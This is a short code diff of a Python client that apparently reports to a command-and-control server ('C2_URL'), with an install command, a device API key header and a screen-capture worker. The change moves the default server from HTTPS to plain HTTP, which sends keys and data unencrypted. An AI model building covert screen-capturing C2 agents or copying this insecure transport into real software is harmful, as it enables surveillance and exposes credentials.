@@ -242,7 +242,7 @@ if __name__ == "__main__":
         C2_URL = f"{args.c2_url}/api"
     else:
         # Default for non-install commands if not provided
-        C2_URL = "https://127.0.0.1:8000/api" # Changed to HTTPS
+        C2_URL = "http://127.0.0.1:8000/api" # Changed to HTTP
 
     if args.command == "install":
         if not args.c2_url:
@@ -263,10 +263,7 @@ def _make_request(method: str, endpoint: str, **kwargs):
     if DEVICE_API_KEY:
         headers["X-API-Key"] = DEVICE_API_KEY
     
-    # Disable SSL verification for self-signed certs in development/testing
-    # In production, this should be 'verify=True' and a proper CA-signed cert
-    kwargs["verify"] = False 
-
+    # SSL verification is not needed for HTTP
     return requests.request(method, f"{C2_URL}{endpoint}", headers=headers, **kwargs)
 
 def screencap_worker(device_id):
